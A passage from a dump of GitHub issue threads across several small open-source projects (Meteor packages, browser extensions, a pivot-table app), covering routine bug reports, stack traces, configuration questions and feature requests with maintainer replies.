    <Comment>
      <Owner>TangentFoxy</Owner>
      <Body>Was this ever actually tested? What's up?
</Body>
    </Comment>
  </Issue_712>
  <Issue_713>
    <Repository>webpivottable</Repository>
    <Title>Documentation missing auth configuration</Title>
    <Owner>bright-sea</Owner>
    <Body>i can see that the app calls /auth/signin and /auth/signup.  can you provide some information on how to redirect these properly to work on our systems?

thanks in advance!
</Body>
    <State>open</State>
    <Comment>
      <Owner>bright-sea</Owner>
      <Body>Hi mxk1235,

Right now, our signin and signup are only  point to our nodejs backend services. You can see the source code of these services in our downloadable zip file for brightbi project.

Of course, we can redirect these calls to your system. Please provide your detail requirements and we can add it ASAP.

Thanks

Minghai Zhao  
</Body>
    </Comment>
    <Comment>
      <Owner>mxk1235</Owner>
      <Body>thanks for the response.  yes, i managed to pull additional code from brightBI table, and it's working now in my own fork.  i think the correct way to do it would be to add that those endpoints to webpivottable, with a config flag that either turns it on, or forwards it to some other auth server.
</Body>
    </Comment>
    <Comment>
      <Owner>bright-sea</Owner>
      <Body>This is a good point and we will add it in future version.

Thanks
</Body>
    </Comment>
  </Issue_713>
  <Issue_714>
    <Repository>html5up-strata</Repository>
    <Title>Version using iron:router and yield</Title>
    <Owner>chip</Owner>
    <Body>Have you tried making a version using iron:router and templates split in different files? 
</Body>
    <State>open</State>
    <Comment>
      <Owner>chip</Owner>
      <Body>No, but would be happy to review a Pull Request from you or anyone who wants to take a stab at it.
</Body>
    </Comment>
  </Issue_714>
  <Issue_715>
    <Repository>spoiler_patrol</Repository>
    <Title>re write storage objects to include wordcount</Title>
    <Owner>citylims</Owner>
    <Body>should have written the storage code to handle this from the start. DOH! 
</Body>
    <State>open</State>
    <Comment>
      <Owner>citylims</Owner>
      <Body>This is hooked up. There are some bugs and the accuracy of the word matching isn't as stable as before. 
Time to write some tests
</Body>
    </Comment>
  </Issue_715>
  <Issue_716>
    <Repository>Custom-JavaScript-for-Websites-2</Repository>
    <Title>Recently stopped working.</Title>
    <Owner>xcv58</Owner>
    <Body>Tried with current version and dev. The popup just shows a spinning blue circle and when i inspect it complains about &#13;
&#13;
    Array.from(o, function() {&#13;
            throw 2&#13;
        })&#13;
&#13;
popup.js:63 Uncaught (in promise) Error: Get no data for active tab!&#13;
    at popup.js:63&#13;
    at Generator.next (&lt;anonymous&gt;)&#13;
    at r (popup.js:63)&#13;
    at popup.js:63&#13;
    at new Promise (&lt;anonymous&gt;)&#13;
    at popup.js:63&#13;
    at popup.js:63&#13;
    at e (popup.js:51)&#13;
(anonymous) @ popup.js:63&#13;
r @ popup.js:63&#13;
(anonymous) @ popup.js:63&#13;
(anonymous) @ popup.js:63&#13;
(anonymous) @ popup.js:63&#13;
e @ popup.js:51&#13;
popup.js:51 Uncaught (in promise) Error: The message port closed before a response was received.&#13;
    at e (popup.js:51)&#13;
</Body>
    <State>open</State>
    <Comment>
      <Owner>xcv58</Owner>
      <Body>Thanks @xul8tr &#13;
Does this happen for all tabs or just some tabs?</Body>
    </Comment>
    <Comment>
      <Owner>xul8tr</Owner>
      <Body>All, i tried on 2 different computers</Body>
    </Comment>
    <Comment>
      <Owner>xcv58</Owner>
      <Body>The message `The message port closed before a response was received` should appear in development mode only. Are you trying to dev this extension?&#13;
&#13;
I can't reproduce the same bug on my laptop. Could you please provide your operating system and chrome version?</Body>
    </Comment>
    <Comment>
      <Owner>xul8tr</Owner>
      <Body>Ok, so 2 things.&#13;
&#13;
1) The "Developer Mode" switch on the extensions page was on&#13;
&#13;
2) It now work on normal Chrome but main driver is Chrome Dev, Is there something i can do so that i can use Chrome Dev as well?</Body>
    </Comment>
    <Comment>
      <Owner>xcv58</Owner>
      <Body>I can only reproduce your bug once on Chrome Dev. Does it work without `Inspect Popup`?&#13;
&#13;
If yes, you can open it in a new tab and inspect the normal tab.</Body>
    </Comment>
    <Comment>
      <Owner>xul8tr</Owner>
      <Body>No, it just sits and spins, 2.5.1 works.</Body>
    </Comment>
    <Comment>
      <Owner>xcv58</Owner>
      <Body>Do you mean the [2.5.1](https://github.com/xcv58/Custom-JavaScript-for-Websites-2/releases/tag/v2.5.1)?&#13;
&#13;
Could you please try 3.0.0?</Body>
    </Comment>
    <Comment>
      <Owner>xul8tr</Owner>
      <Body>I went from latest tag to the next, one by one. It wasn't until 2.5.1 that it worked in developer mode.</Body>
    </Comment>
    <Comment>
      <Owner>xcv58</Owner>
      <Body>Thank you very much! I'll dig into this.</Body>
    </Comment>
    <Comment>
      <Owner>xcv58</Owner>
      <Body>Tried several possible ways to reproduce the bug. All below can't reproduce the bug:&#13;
&#13;
- Use `npm` instead of `yarn`&#13;
- Use lower version node&#13;
- Use different versions of Chrome&#13;
&#13;
It seems the bug occurs during the connection between the extension and background page:&#13;
https://github.com/xcv58/Custom-JavaScript-for-Websites-2/blob/fb9ae5924426ad84721de916572832489682384a/src/js/stores/AppStore.js#L102&#13;
&#13;
It would be helpful if you can log the response and call in both `AppStore` and [`background.js`](https://github.com/xcv58/Custom-JavaScript-for-Websites-2/blob/fb9ae5924426ad84721de916572832489682384a/src/js/background.js#L9). Since I can't reproduce the bug.</Body>
    </Comment>
    <Comment>
      <Owner>xul8tr</Owner>
      <Body>If you just download the dev version of chrome and install the the extension it doesn't work. I didn't do anything more than that.</Body>
    </Comment>
  </Issue_716>
  <Issue_717>
    <Repository>Custom-JavaScript-for-Websites-2</Repository>
    <Title>Does not work anymore</Title>
    <Owner>xcv58</Owner>
    <Body>Hi, I used the extension for months but it doesn't work anymore apparrently without a reason.&#13;
I insertend an alert('foo') in page script but it doesn't appear on page.&#13;
&#13;
For example if I try to add a script on github I see this error in console:&#13;
&#13;
Refused to execute script from 'https://github.com/undefined' because its MIME type ('text/html') is not executable, and strict MIME type checking is enabled.&#13;
&#13;
That depends from extension. The error appear only when cjs is enabled.</Body>
    <State>open</State>
    <Comment>
      <Owner>xcv58</Owner>
      <Body>Thanks, @adrianofoschi I can't reproduce the bug on my laptop.&#13;
&#13;
Does it work for other websites? Could you please tell me your operating system version and chrome version?</Body>
    </Comment>
    <Comment>
      <Owner>adrianofoschi</Owner>
      <Body>It worked with my old-saved scripts but If I edit one it saves it but it executes the old script.&#13;
It happens with every website.&#13;
&#13;
I tried on 2 systems, with 2 different google accounts:&#13;
- Linux 4.17.5 (ArchLinux 64 bit), Chrome 63.0.3239.132 (Official Build) (64 bit)&#13;
- Windows 10 (Pro 64 bit), Chrome 67.0.3396.99 (Official Build) (64 bit)</Body>
    </Comment>
    <Comment>
      <Owner>xcv58</Owner>
      <Body>I think you may forget to click the `Save` button at the top left.&#13;
![image](https://user-images.githubusercontent.com/503123/42833258-729b9950-89a8-11e8-8bdf-2438368258ad.png)&#13;
</Body>
    </Comment>
  </Issue_717>
  <Issue_718>
    <Repository>Custom-JavaScript-for-Websites-2</Repository>
    <Title>The way we handle extra scripts is broken!</Title>
    <Owner>xcv58</Owner>
    <Body>related to #44&#13;
&#13;
The replace `;` to `\n` and join back is breaking the workflow, details:&#13;
&#13;
https://github.com/xcv58/Custom-JavaScript-for-Websites-2/blob/8a9427ebec2eacaae78fae0ed5b49963930829bd/src/js/stores/IncludeStore.js#L3-L4&#13;
&#13;
https://github.com/xcv58/Custom-JavaScript-for-Websites-2/blob/8a9427ebec2eacaae78fae0ed5b49963930829bd/src/js/run.js#L39-L43</Body>
    <State>open</State>
    <Comment>
      <Owner>xcv58</Owner>
      <Body>We should move the external scripts to a list of string instead of pure text.&#13;
&#13;
And we need a warning message for users with valid external scripts to migrate to the new way.</Body>
    </Comment>
  </Issue_718>
  <Issue_719>
    <Repository>meteor-auth0</Repository>
    <Title>Sample app is failing to run. Please help!!!</Title>
    <Owner>xcv58</Owner>
    <Body>I followed the directions to the letter:&#13;
From the project folder: `C:\Development\Meteor Projects\meteor-auth0\examples\sample-app`&#13;
I ran: `meteor --settings production.settings.json`&#13;
&#13;
And I got an error that I have no idea how to fix:&#13;
```&#13;
[[[[[ C:\Development\Meteor Projects\meteor-auth0\examples\sample-app ]]]]]&#13;
&#13;
=&gt; Started proxy.&#13;
C:\Users\fshafique\AppData\Local\.meteor\packages\meteor-tool\1.6.1\mt-os.windows.x86_64\dev_bundle\lib\node_modules\meteor-promise\promise_server.js:218&#13;
      throw error;&#13;
      ^&#13;
&#13;
TypeError: Path must be a string. Received undefined&#13;
    at assertPath (path.js:28:11)&#13;
    at relative (path.js:1262:5)&#13;
    at ImportScanner._getRelativeImportId (C:\tools\isobuild\import-scanner.js:662:24)&#13;
    at each (C:\tools\isobuild\import-scanner.js:632:33)&#13;
    at _.each._.forEach (C:\Users\fshafique\AppData\Local\.meteor\packages\meteor-tool\1.6.1\mt-os.windows.x86_64\dev_bundle\lib\node_modules\underscore\underscore.js:87:22)&#13;
    at ImportScanner._resolve (C:\tools\isobuild\import-scanner.js:621:7)&#13;
    at each (C:\tools\isobuild\import-scanner.js:728:29)&#13;
    at _.each._.forEach (C:\Users\fshafique\AppData\Local\.meteor\packages\meteor-tool\1.6.1\mt-os.windows.x86_64\dev_bundle\lib\node_modules\underscore\underscore.js:87:22)&#13;
    at ImportScanner._scanFile (C:\tools\isobuild\import-scanner.js:719:5)&#13;
    at each (C:\tools\isobuild\import-scanner.js:812:12)&#13;
    at _.each._.forEach (C:\Users\fshafique\AppData\Local\.meteor\packages\meteor-tool\1.6.1\mt-os.windows.x86_64\dev_bundle\lib\node_modules\underscore\underscore.js:87:22)&#13;
    at ImportScanner._scanFile (C:\tools\isobuild\import-scanner.js:719:5)&#13;
    at each (C:\tools\isobuild\import-scanner.js:812:12)&#13;
    at _.each._.forEach (C:\Users\fshafique\AppData\Local\.meteor\packages\meteor-tool\1.6.1\mt-os.windows.x86_64\dev_bundle\lib\node_modules\underscore\underscore.js:87:22)&#13;
    at ImportScanner._scanFile (C:\tools\isobuild\import-scanner.js:719:5)&#13;
    at each (C:\tools\isobuild\import-scanner.js:812:12)&#13;
    at _.each._.forEach (C:\Users\fshafique\AppData\Local\.meteor\packages\meteor-tool\1.6.1\mt-os.windows.x86_64\dev_bundle\lib\node_modules\underscore\underscore.js:87:22)&#13;
    at ImportScanner._scanFile (C:\tools\isobuild\import-scanner.js:719:5)&#13;
    at each (C:\tools\isobuild\import-scanner.js:812:12)&#13;
    at _.each._.forEach (C:\Users\fshafique\AppData\Local\.meteor\packages\meteor-tool\1.6.1\mt-os.windows.x86_64\dev_bundle\lib\node_modules\underscore\underscore.js:87:22)&#13;
    at ImportScanner._scanFile (C:\tools\isobuild\import-scanner.js:719:5)&#13;
    at each (C:\tools\isobuild\import-scanner.js:812:12)&#13;
    at _.each._.forEach (C:\Users\fshafique\AppData\Local\.meteor\packages\meteor-tool\1.6.1\mt-os.windows.x86_64\dev_bundle\lib\node_modules\underscore\underscore.js:87:22)&#13;
    at ImportScanner._scanFile (C:\tools\isobuild\import-scanner.js:719:5)&#13;
    at outputFiles.forEach.file (C:\tools\isobuild\import-scanner.js:414:14)&#13;
    at Array.forEach (&lt;anonymous&gt;)&#13;
    at ImportScanner.scanImports (C:\tools\isobuild\import-scanner.js:412:22)&#13;
    at sourceBatches.forEach.batch (C:\tools\isobuild\compiler-plugin.js:1045:17)&#13;
    at Array.forEach (&lt;anonymous&gt;)&#13;
    at Function.computeJsOutputFilesMap (C:\tools\isobuild\compiler-plugin.js:1013:19)&#13;
    at ClientTarget._emitResources (C:\tools\isobuild\bundler.js:1057:8)&#13;
    at buildmessage.enterJob (C:\tools\isobuild\bundler.js:828:12)&#13;
    at C:\tools\utils\buildmessage.js:359:18&#13;
    at exports.EnvironmentVariable.withValue (C:\tools\utils\fiber-helpers.js:89:14)&#13;
    at C:\tools\utils\buildmessage.js:352:34&#13;
    at exports.EnvironmentVariable.withValue (C:\tools\utils\fiber-helpers.js:89:14)&#13;
    at C:\tools\utils\buildmessage.js:350:23&#13;
    at exports.EnvironmentVariable.withValue (C:\tools\utils\fiber-helpers.js:89:14)&#13;
    at Object.enterJob (C:\tools\utils\buildmessage.js:324:26)&#13;
    at ClientTarget.make (C:\tools\isobuild\bundler.js:819:18)&#13;
    at C:\tools\isobuild\bundler.js:2929:14&#13;
    at C:\tools\isobuild\bundler.js:3018:20&#13;
    at Array.forEach (&lt;anonymous&gt;)&#13;
    at Function._.each._.forEach (C:\Users\fshafique\AppData\Local\.meteor\packages\meteor-tool\1.6.1\mt-os.windows.x86_64\dev_bundle\lib\node_modules\underscore\underscore.js:79:11)&#13;
    at C:\tools\isobuild\bundler.js:3017:7&#13;
    at C:\tools\utils\buildmessage.js:271:13&#13;
    at exports.EnvironmentVariable.withValue (C:\tools\utils\fiber-helpers.js:89:14)&#13;
    at C:\tools\utils\buildmessage.js:264:29&#13;
    at exports.EnvironmentVariable.withValue (C:\tools\utils\fiber-helpers.js:89:14)&#13;
    at C:\tools\utils\buildmessage.js:262:18&#13;
    at exports.EnvironmentVariable.withValue (C:\tools\utils\fiber-helpers.js:89:14)&#13;
    at C:\tools\utils\buildmessage.js:253:23&#13;
    at exports.EnvironmentVariable.withValue (C:\tools\utils\fiber-helpers.js:89:14)&#13;
    at Object.capture (C:\tools\utils\buildmessage.js:252:19)&#13;
    at bundle (C:\tools\isobuild\bundler.js:2910:31)&#13;
    at files.withCache (C:\tools\isobuild\bundler.js:2857:32)&#13;
    at Object.withCache (C:\tools\fs\files.js:1664:12)&#13;
    at Object.exports.bundle (C:\tools\isobuild\bundler.js:2857:16)&#13;
    at Profile.run (C:\tools\runners\run-app.js:579:36)&#13;
    at Function.run (C:\tools\tool-env\profile.js:490:12)&#13;
    at bundleApp (C:\tools\runners\run-app.js:578:34)&#13;
    at AppRunner._runOnce (C:\tools\runners\run-app.js:622:35)&#13;
    at AppRunner._fiber (C:\tools\runners\run-app.js:880:28)&#13;
    at C:\tools\runners\run-app.js:408:12&#13;
&#13;
```&#13;
&#13;
## Please help!!!</Body>
    <State>open</State>
    <Comment>
      <Owner>xcv58</Owner>
      <Body>I think this is related to https://github.com/meteor/meteor/issues/9755&#13;
&#13;
Could you try to upgrade Meteor?</Body>
    </Comment>
    <Comment>
      <Owner>fshafique</Owner>
      <Body>Funny, I was on the same article when I saw your email.&#13;
&#13;
I thought I'd update again - I'm new to Meteor, so I assume upgrade=update:&#13;
```&#13;
C:\Development\Meteor Projects\meteor-auth0\examples\sample-app&gt;meteor update&#13;
&#13;
Changes to your project's package version selections from updating the release:&#13;
&#13;
babel-compiler  upgraded from 7.0.0 to 7.0.6&#13;
ecmascript      upgraded from 0.10.0 to 0.10.6&#13;
&#13;
sample-app: updated to Meteor 1.6.1.1.&#13;
&#13;
Changes to your project's package version selections from updating package versions:&#13;
&#13;
babel-compiler             upgraded from 7.0.6 to 7.0.7&#13;
base64                     upgraded from 1.0.10 to 1.0.11&#13;
check                      upgraded from 1.3.0 to 1.3.1&#13;
ddp-client                 upgraded from 2.3.1 to 2.3.2&#13;
ecmascript                 upgraded from 0.10.6 to 0.10.7&#13;
ecmascript-runtime-client  upgraded from 0.6.0 to 0.6.2&#13;
http                       upgraded from 1.4.0 to 1.4.1&#13;
jquery                     upgraded from 1.11.10 to 1.11.11&#13;
logging                    upgraded from 1.1.19 to 1.1.20&#13;
meteor                     upgraded from 1.8.2 to 1.8.6&#13;
minifier-css               upgraded from 1.3.0 to 1.3.1&#13;
minifier-js                upgraded from 2.3.1 to 2.3.4&#13;
minimongo                  upgraded from 1.4.3 to 1.4.4&#13;
modules                    upgraded from 0.11.3 to 0.11.6&#13;
mongo                      upgraded from 1.4.2 to 1.4.7&#13;
mongo-id                   upgraded from 1.0.6 to 1.0.7&#13;
oauth                      upgraded from 1.2.1 to 1.2.3&#13;
promise                    upgraded from 0.10.1 to 0.10.2&#13;
rate-limit                 upgraded from 1.0.8 to 1.0.9&#13;
routepolicy                upgraded from 1.0.12 to 1.0.13&#13;
standard-minifier-css      upgraded from 1.4.0 to 1.4.1&#13;
standard-minifier-js       upgraded from 2.3.1 to 2.3.3&#13;
&#13;
&#13;
```&#13;
Then I tried running it again:  `meteor --settings production.settings.json`&#13;
&#13;
I still get the same error.</Body>
    </Comment>
    <Comment>
      <Owner>xcv58</Owner>
      <Body>According to https://github.com/meteor/meteor/releases&#13;
You may need to `meteor update --release 1.7-beta.25`&#13;
&#13;
I have no Windows machines so it's really hard to reproduce the bug.</Body>
    </Comment>
    <Comment>
      <Owner>fshafique</Owner>
      <Body>I just tried it. It hasn't helped. My update also froze near the end, but let me try again from scratch. Thanks for all the help -- my last option might be to run it a Linux VM. I don't have anything setup for immediate use.</Body>
    </Comment>
    <Comment>
      <Owner>xcv58</Owner>
      <Body>np https://github.com/jshimko/meteor-launchpad This is a lighter solution than a Linux VM. And I usually use it to deploy Meteor app.</Body>
    </Comment>
    <Comment>
      <Owner>fshafique</Owner>
      <Body>Works on Linux!</Body>
    </Comment>
    <Comment>
      <Owner>fshafique</Owner>
      <Body>@xcv58 I just want to share my latest findings with you: [https://github.com/meteor/meteor/issues/9841#issuecomment-384536585](https://github.com/meteor/meteor/issues/9841#issuecomment-384536585)&#13;
&#13;
I think it may have something to do with the colon in the package name "xcv58:auth0-lock".  But I'm comparing it with "kadira:flow-router", because I have no issues with that package.&#13;
&#13;
</Body>
    </Comment>
    <Comment>
      <Owner>xcv58</Owner>
      <Body>@fshafique thanks for digging into this. I'll fix this if we can confirm it's caused by the `:` in the path.</Body>
    </Comment>
    <Comment>
      <Owner>alvin</Owner>
      <Body>Can confirm that I was getting the same `TypeError: Path must be a string. Received undefined` startup error until installing the package locally and removing the "xcv58:" prefix</Body>
    </Comment>
  </Issue_719>
  <Issue_720>
    <Repository>meteor-auth0</Repository>
    <Title>How to use this with Meteor React</Title>
    <Owner>xcv58</Owner>
    <Body>I am unable to get the profile data fetched from google after using the package. CurrentUser.services.auth0 is showing the property undefined error.&#13;
Can you please provide me the sample with react?&#13;
I am in hurry</Body>
    <State>open</State>
    <Comment>
      <Owner>xcv58</Owner>
      <Body>Are you able to get data? Do you have any reproduce sample?</Body>
    </Comment>
    <Comment>
      <Owner>sonipriya10</Owner>
      <Body>Yes I am getting the data in MongoDB, but unable to get the data from mongodb to react app.&#13;
Please provide the soolution asap. as I am in middle of the project and I have to submit it soon. Thank You.</Body>
    </Comment>
    <Comment>
      <Owner>sonipriya10</Owner>
      <Body>Is it possble for you to provide an example with react? That will be very kind of you.</Body>
    </Comment>
    <Comment>
      <Owner>xcv58</Owner>
      <Body>I think you need to publish the filed you need, for example:&#13;
&#13;
https://github.com/xcv58/meteor-auth0/blob/805fdf66ff11eb1f7f73cfefd503d62767008075/auth0-lock/auth0-lock-server.js#L60-L63</Body>
    </Comment>
    <Comment>
      <Owner>sonipriya10</Owner>
      <Body>Can you provide me the sample page as you have made with blaze for using this with react?</Body>
    </Comment>
    <Comment>
      <Owner>xcv58</Owner>
      <Body>If you can't see the data in front end then it's not relating to Blaze or React.&#13;
&#13;
Could you verify whether you can get data?</Body>
    </Comment>
    <Comment>
      <Owner>sonipriya10</Owner>
      <Body>I am not getting data in front end. The data is getting save in MongoDB under users-&gt;services-&gt;auth0</Body>
    </Comment>
    <Comment>
      <Owner>xcv58</Owner>
      <Body>Please follow this instructions to publish your data https://guide.meteor.com/accounts.html#publish-custom-data</Body>
    </Comment>
    <Comment>
      <Owner>sonipriya10</Owner>
      <Body>Will try and let You know. Can you provide a sample page with react getting profile data.</Body>
    </Comment>
    <Comment>
      <Owner>xcv58</Owner>
      <Body>As I mentioned before the data and UI rendering is not related.  I don't think a React example will make any difference.</Body>
    </Comment>
    <Comment>
      <Owner>sonipriya10</Owner>
      <Body>I am asking this because when I am using the exact same sample app which you have provided everything is working fine. I am getting data also in frontend. Thatwhy I am asking you to provide me an example with react.</Body>
    </Comment>
    <Comment>
      <Owner>sonipriya10</Owner>
      <Body>Hey please can you help, I am unable to get data using currentUser in frontend?</Body>
    </Comment>
    <Comment>
      <Owner>sonipriya10</Owner>
      <Body>In my file&#13;
&#13;
login(e){&#13;
    e.preventDefault();&#13;
    const Lock = initLock();&#13;
&#13;
     Lock.show();&#13;
   }&#13;
&#13;
it is showing initLock is not a function?&#13;
&#13;
I have imported the package also.</Body>
    </Comment>
    <Comment>
      <Owner>xcv58</Owner>
      <Body>Can you log what's `initLock` and please share how you import the package?</Body>
    </Comment>
    <Comment>
      <Owner>sonipriya10</Owner>
      <Body>initLock is a function created as shown in your sample app.&#13;
&#13;
import React,{Component} from 'react';&#13;
import {meteor} from 'meteor/meteor';&#13;
import {initLock} from 'meteor/xcv58:auth0-lock';</Body>
    </Comment>
    <Comment>
      <Owner>xcv58</Owner>
      <Body>I'm confused. You said `initLock` is not function but is a function now. </Body>
    </Comment>
  </Issue_720>
  <Issue_721>
    <Repository>meteor-auth0</Repository>
    <Title>How to get auth0 user metadata as part of user information?</Title>
    <Owner>xcv58</Owner>
    <Body>Hi,&#13;
I am using this package in my application, it's working fine. But I am unable to get the user metadata along with the user information. Below is the sample code tried to fetch the metadata:&#13;
&#13;
const   scopes = {&#13;
        auth: {&#13;
        params: {&#13;
            scope: 'user_metadata'&#13;
        }&#13;
        }&#13;
        };&#13;
   auth0 = initLock({&#13;
    closable: true,&#13;
    autoclose: true,&#13;
    allowForgotPassword: true,&#13;
    allowSignUp: false,    &#13;
                   scopes &#13;
  }); &#13;
        auth0.show();&#13;
&#13;
Could you please help me on this.</Body>
    <State>open</State>
    <Comment>
      <Owner>xcv58</Owner>
      <Body>Do you have a reproduce repo for this?</Body>
    </Comment>
  </Issue_721>
  <Issue_722>
    <Repository>meteor-chess</Repository>
    <Title>How is it supposed to work</Title>
    <Owner>xcv58</Owner>
    <Body>Hi,

Your app is very interesting.  However, I can't understand how its supposed to work.  What generates the tokens etc?

In the mean time I've commented out the token etc code and the board seems to work, although an extra piece temporarily appears when I drag-move a piece.

Anyway, great work and I hope my comments are useful.

Cheers,

Steve
</Body>
    <State>open</State>
    <Comment>
      <Owner>xcv58</Owner>
      <Body>I'm sorry for misleading you.

This is not a regular chess game. It aims to provide a cooperative chess game. I mean, one player with one token can only play one step.

You need to change token related codes, if you wanna a regular chess game.

Hope this can solve your problem.

Thanks,
xcv58
</Body>
    </Comment>
    <Comment>
      <Owner>steinitz-zz</Owner>
      <Body>Thanks for your friendly reply.  I don't feel misled :)

Ah I see, a cooperative game.  Cool.

I've modified it to work as a normal game.  What I was really asking is how it's supposed to work.  I'd like to try it, but can't see how to make it work.  Maybe it's not ready yet?  No rush on my part.

Anyway, please, no need to apologize - no problems here.  I'm just curious.  It looks interesting. Nice piece of work.

Cheers,

Steve
</Body>
    </Comment>
    <Comment>
      <Owner>xcv58</Owner>
      <Body>It actually uses http://chessboardjs.com to drive chess game.
So you can find full document from http://chessboardjs.com/docs

Thanks,
xcv58
</Body>
    </Comment>
    <Comment>
      <Owner>steinitz-zz</Owner>
      <Body>Yes, I'm familiar with the chessboardjs and chessjs libraries.  I was more asking about your code, how the tokens etc are supposed to work.  Out of the box, it's a head scratcher :)

Cheers,

Steve
</Body>
    </Comment>
    <Comment>
      <Owner>xcv58</Owner>
      <Body>It's my bad. I only use this as course project, focus on the cooperation. The tokens are for participants, to make sure each participant can only play one step.

Best,
xcv58
</Body>
    </Comment>
  </Issue_722>
  <Issue_723>
    <Repository>meteor-collectionapi</Repository>
    <Title>Is this compatible with Meteor 1.5?</Title>
    <Owner>xcv58</Owner>
    <Body>With default settings I get an empty response from curl for GET and POST does not add anything to the collection. Configured as standAlone I get this error:&#13;
&#13;
W20170621-17:15:29.545(-7)? (STDERR) TypeError: listener must be a function&#13;
W20170621-17:15:29.546(-7)? (STDERR)     at Server.addListener (events.js:197:11)&#13;
W20170621-17:15:29.547(-7)? (STDERR)     at new Server (_http_server.js:235:10)&#13;
</Body>
    <State>open</State>
    <Comment>
      <Owner>xcv58</Owner>
      <Body>Hi @j18ter,&#13;
&#13;
I haven't touched this package for a while. It may have breaking change(s) from Meteor 1.3.1 to 1.5.</Body>
    </Comment>
  </Issue_723>
  <Issue_724>
    <Repository>Tab-Manager-v2</Repository>
    <Title>Opening a tab from within the extension doesn't work in Firefox</Title>
    <Owner>xcv58</Owner>
    <Body>It doesn't matter if I use the keyboard or the mouse, I see a few flashes as if it's loading and the following in the Browser console, but the extension doesn't switch to the tab:&#13;
Error: Type error for parameter updateProperties (Property "selected" is unsupported by Firefox) for tabs.update.</Body>
    <State>open</State>
    <Comment>
      <Owner>xcv58</Owner>
      <Body>Thanks @keithbowes for reporting this. It should be fixed in v0.19.8 https://addons.mozilla.org/en-US/firefox/addon/tab-manager-v2/</Body>
    </Comment>
  </Issue_724>
  <Issue_725>
    <Repository>Tab-Manager-v2</Repository>
    <Title>Opening via the keyboard (Alt-T) doesn't work in Firefox</Title>
    <Owner>xcv58</Owner>
    <Body>When I try it in Firefox (both the latest ESR and Nightly), I get the following error in the Browser Console:&#13;
Error: Type error for parameter createData (Property "focused" is unsupported by Firefox) for windows.create.&#13;
&#13;
Perhaps, you could use a try...catch and call without any properties in case it fails.</Body>
    <State>open</State>
    <Comment>
      <Owner>xcv58</Owner>
      <Body>Thanks @keithbowes for reporting this. It should be fixed in v0.19.8 https://addons.mozilla.org/en-US/firefox/addon/tab-manager-v2/</Body>
    </Comment>
  </Issue_725>
  <Issue_726>
    <Repository>Tab-Manager-v2</Repository>
    <Title>Make the UI faster </Title>
    <Owner>xcv58</Owner>
    <Body>The animation seems to be tedious and unuseful especially there are not too many tabs.&#13;
&#13;
And defer the calculation like duplicated tabs detection can speed up the first UI render.</Body>
    <State>open</State>
    <Comment>
      <Owner>xcv58</Owner>
      <Body>A good example: https://chrome.google.com/webstore/detail/cluster-window-tab-manage/aadahadfdmiibmdhfmpbeeebejmjnkef&#13;
&#13;
We need a way to measure the performance as well.</Body>
    </Comment>
    <Comment>
      <Owner>xcv58</Owner>
      <Body>I tested just React and useState without anything related to MobX, the performance is not acceptable as well.&#13;
&#13;
I guess it's caused by the way we build html/css/js which has to rely on the JS code to execute and our js code is a huge file which leads to a long time (x0ms - x00ms) to load and parse. I will do more research on this.&#13;
&#13;
Gatsby seems a good fit to speed up the performance.</Body>
    </Comment>
  </Issue_726>
  <Issue_727>
    <Repository>Tab-Manager-v2</Repository>
    <Title>Request to be able to rename tabs groups to something meaningful.</Title>
    <Owner>xcv58</Owner>
    <Body>I've found your extension browsing for a tab managers/grouper and it Tab-Manager-v2 seem very good and simple at the same time, also it is very responsive.&#13;
&#13;
But what I'd like is to be able to rename tabs groups to something meaningful than only the number of tabs in the header of the group.&#13;
&#13;
Here's a quick mockup: &#13;
&#13;
![image](https://user-images.githubusercontent.com/5678673/46116337-9cea7b00-c1c9-11e8-8bbf-4c054d2e4bec.png)&#13;
&#13;
&#13;
If you need more informations just ask me.&#13;
&#13;
&#13;
Best Regards :octocat: &#13;
</Body>
    <State>open</State>
    <Comment>
      <Owner>xcv58</Owner>
      <Body>To add a title is not hard. But it seems not very intuitive to manage. &#13;
&#13;
* You have to manually type the title. &#13;
* The title will be lost if you accidentally close the window. &#13;
* It's also a mess if you open some tabs not related to the current group.&#13;
&#13;
Any idea for the above situations?</Body>
    </Comment>
    <Comment>
      <Owner>mikhoul</Owner>
      <Body>[**@xcv58**](https://github.com/xcv58) commented on [26 sept. 2018 &#224; 23:34 UTC&#8722;4](https://github.com/xcv58/Tab-Manager-v2/issues/232#issuecomment-424947585 "2018-09-27T03:34:07Z - Replied by Github Reply Comments"):&#13;
&gt; To add a title is not hard. But it seems not very intuitive to manage.&#13;
&gt; &#13;
&gt; *   You have to manually type the title.&#13;
&#13;
Only the first time we name it, after name should be saved in a DB and tagged to the tabs group until l the groupe is empty. &#13;
&#13;
&#13;
&gt; *   The title will be lost if you accidentally close the window.&#13;
&#13;
Not if the name is saved in a DB and tagged to the tab group.&#13;
&#13;
&gt; *   It's also a mess if you open some tabs not related to the current group.&#13;
&#13;
Not really because I keep all my session clean with name like "Programming project XYZ", Movies, Android Stuff, etc...   So when I work on a project I just open the right tab group. &#128522;&#13;
&#13;
&#13;
&#13;
</Body>
    </Comment>
    <Comment>
      <Owner>xcv58</Owner>
      <Body>I can investigate whether it's doable by Chrome API, https://developer.chrome.com/extensions/windows.&#13;
&#13;
A blocker is whether we get the same window id once your Chrome restart. Otherwise, there is no way to keep track a window during multiple sessions.</Body>
    </Comment>
  </Issue_727>
  <Issue_728>
    <Repository>apollo-connector-mongodb</Repository>
    <Title>Is the readme out of date?</Title>
    <Owner>tomitrescak</Owner>
    <Body>Very interested in trying this library but I'm thinking that the current implementation doesn't match the readme. Do you have a working example hosted anywhere?</Body>
    <State>open</State>
    <Comment>
      <Owner>idkjs</Owner>
      <Body>Anything working sample you can share would be greatly appreciated. Thank you.</Body>
    </Comment>
    <Comment>
      <Owner>Jscott388</Owner>
      <Body>Where does this stand?</Body>
    </Comment>
    <Comment>
      <Owner>tomitrescak</Owner>
      <Body>Well, the lib is stable and recently been upgraded to Mongo 3. I use it in 12 different apps and is actively maintained. The problem are the docs that could use an update.</Body>
    </Comment>
    <Comment>
      <Owner>idkjs</Owner>
      <Body>Any of those apps public @tomitrescak ? Link to an example repo maybe?</Body>
    </Comment>
  </Issue_728>
  <Issue_729>
    <Repository>apollo-mobx</Repository>
    <Title>BUG: HoC does not work with mutations</Title>
    <Owner>tomitrescak</Owner>
    <Body>If I try to use the `grapqhl` hoc with a mutation my app crashes upon initialization with&#13;
`Uncaught (in promise) Error: Must contain a query definition.`&#13;
&#13;
For example:&#13;
&#13;
```tsx&#13;
const createOrgGroupMutation = gql`&#13;
    mutation createOrgGroup ($name: String!) {&#13;
        createOrgGroup(name: $name) {&#13;
            id&#13;
        }&#13;
    }&#13;
`;&#13;
&#13;
export default graphql(createOrgGroupMutation)(CreateOrgGroupDialog);&#13;
&#13;
```&#13;
